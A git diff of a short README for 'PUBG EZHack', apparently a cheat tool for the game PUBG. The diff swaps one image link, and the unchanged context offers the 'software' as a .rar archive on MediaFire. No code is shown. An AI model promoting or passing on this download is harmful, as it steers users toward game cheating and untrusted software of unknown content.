@@ -1,6 +1,6 @@
 # [EZH] PUBG EZHack
 
-![123](https://github.com/FreemanA132/PUBG_SOFTW/assets/149519843/cdb10ffb-de38-4d06-a9ae-6fb3247f8e91)
+![321](https://github.com/FreemanA132/PUBG_SOFTW/assets/149519843/35b58730-8cf0-4db7-8888-501f3ad1279f)
 
 ## 📁Software link: [Link](https://www.mediafire.com/file/0tqgvs4okxixp2w/PUBG-EZH.rar)
 
